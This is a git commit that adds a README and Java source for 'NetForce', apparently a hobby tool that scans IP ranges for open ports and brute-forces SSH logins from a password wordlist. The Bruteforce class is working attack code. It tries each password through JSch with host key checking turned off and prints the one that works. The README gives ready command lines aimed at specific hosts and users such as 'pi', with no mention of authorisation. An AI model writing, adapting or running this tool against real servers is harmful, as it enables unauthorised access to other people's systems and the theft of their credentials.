cb6608ddb02a234e3b93e5c8d2b15a7b663d5890
ThatcherDev <thatcher.clough@gmail.com>
2019-08-16 10:21:49 -0400

    Initial Commit

---
+++ README.md
@@ -0,0 +1,64 @@
+# NetForce
+NetForce: A network scanning and SSH brute forcing tool 
+
+## Features
+NetForce can both scan a network for open ports and brute force attack an SSH server. 
+
+It can scan a network when given a range of IP addresses along with a port to scan for. 
+This will return all IP addresses in the given range with the given port open.
+
+NetForce can also brute force attack an SSH server in attempt to obtain a password.
+This requires a host address/name, port, user, and wordlist file containing passwords to try.
+A sample wordlist file with common SSH passwords is provided in src/main/resources/SSH_Pass.txt.
+
+## Requirements
+- A Java JDK distribution must be installed and added to PATH.
+- Maven must be installed and added to PATH.
+
+## Compatibility
+NetForce is compatible with both Linux and Windows.
+
+## Installation
+```
+# clone NetForce
+git clone https://github.com/ThatcherDev/NetForce.git
+
+# change the working directory to NetForce 
+cd NetForce
+
+# build NetForce with Maven
+mvn clean package
+```
+
+Alternatively, you can download the jar from the [release page](https://github.com/ThatcherDev/NetForce/releases).
+
+## Usage
+```
+java -jar netforce.jar
+NetForce: A network scanning and SSH brute forcing tool (1.0)
+
+Usage:
+	java -jar netforce.jar [-h] [-v] [-s -t IPRANGE -p PORT -w TIMEOUT]
+			       		   [-b -t HOST -p PORT -u USER -f FILE -w TIMEOUT]
+Arguments:
+	-h, --help			Display this message.
+	-v, --version		Display current version.
+	-s, --scan			Scan network for open ports.
+	-b, --bruteforce	Brute force SSH server.
+	-t, --target		Specify IP range when scanning, or host when brute forcing.
+	-p, --port			Specify port to use. (Set to 22 if not specified)
+	-u, --user			Specify user to brute force.
+	-f, --file			Specify wordlist file to user when brute forcing.
+	-w, --wait			Specify connection timeout in milliseconds. (Set to 300 if not specified)
+```
+### Examples of usage:
+```
+java -jar netforce.jar -s -t 192.168.86.1-255 -w 100
+java -jar netforce.jar -s -t 192.168.1-5.1-255 -p 80
+java -jar netforce.jar -b -t 192.168.86.28 -u thatcher -f src/main/resources/SSH_Pass.txt
+java -jar netforce.jar -b -t 192.168.86.57 -p 2222 -u pi -f src/main/resources/SSH_Pass.txt -w 250
+```
+
+## License
+- [MIT](https://choosealicense.com/licenses/mit/)
+- Copyright 2019© ThatcherDev.
---
+++ src/main/java/com/github/thatcherdev/netforce/Bruteforce.java
@@ -0,0 +1,73 @@
+package com.github.thatcherdev.netforce;
+
+import java.io.File;
+import java.util.Scanner;
+import com.jcraft.jsch.JSch;
+import com.jcraft.jsch.JSchException;
+import com.jcraft.jsch.Session;
+
+public class Bruteforce {
+
+	/**
+	 * Start a brute force attack on an SSH server with user {@link user} at host
+	 * {@link host} with port {@link port} and timeout {@link timeout} using
+	 * wordlist {@link file}.
+	 * 
+	 * @param host    host of SSH server to brute force
+	 * @param port    port of SSH server
+	 * @param user    user to brute force
+	 * @param file    name of wordlist file contains passwords to brute force
+	 * @param timeout timeout for connecting to SSH server
+	 */
+	public static void start(String host, int port, String user, String file, int timeout) {
+		Scanner in=null;
+		try{
+			System.out.println("Brute forcing "+user+"@"+host+":"+port+"\n");
+			in=new Scanner(new File(file));
+			while(in.hasNextLine()){
+				String password=in.nextLine();
+				System.out.print("\033[2K\033[56DTrying password '"+password+"'");
+				try{
+					check(host, port, user, password, timeout);
+					System.out.println("\033[2K\033[56DPassword for "+user+"@"+host+":"+port+" is '"+password+"'");
+					return;
+				}catch(Exception e){
+					if(e.getMessage().equals("Auth fail"))
+						continue;
+					else
+						throw new Exception();
+				}
+			}
+			System.out.println("\033[2K\033[56DCould not get password for "+user+"@"+host+":"+port);
+		}catch(Exception e){
+			System.out.print("\033[2K\033[56D");
+			e.printStackTrace();
+		}finally{
+			if(in!=null)
+				in.close();
+		}
+	}
+
+	/**
+	 * Attempt to connect to an SSH server with user {@link user} at host
+	 * {@link host} with port {@link port}, password {@link password}, and timeout
+	 * {@link timeout}.
+	 * 
+	 * @param host     host of SSH server
+	 * @param port     port of SSH server
+	 * @param user     user to login to
+	 * @param password password to user to login
+	 * @param timeout  timeout for connecting to SSH server // * @return if login
+	 *                 was successful
+	 * @throws JSchException
+	 */
+	private static void check(String host, int port, String user, String password, int timeout) throws JSchException {
+		JSch jsch=new JSch();
+		Session session=jsch.getSession(user, host, port);
+		session.setConfig("StrictHostKeyChecking", "no");
+		session.setTimeout(timeout);
+		session.setPassword(password);
+		session.connect();
+		session.disconnect();
+	}
+}
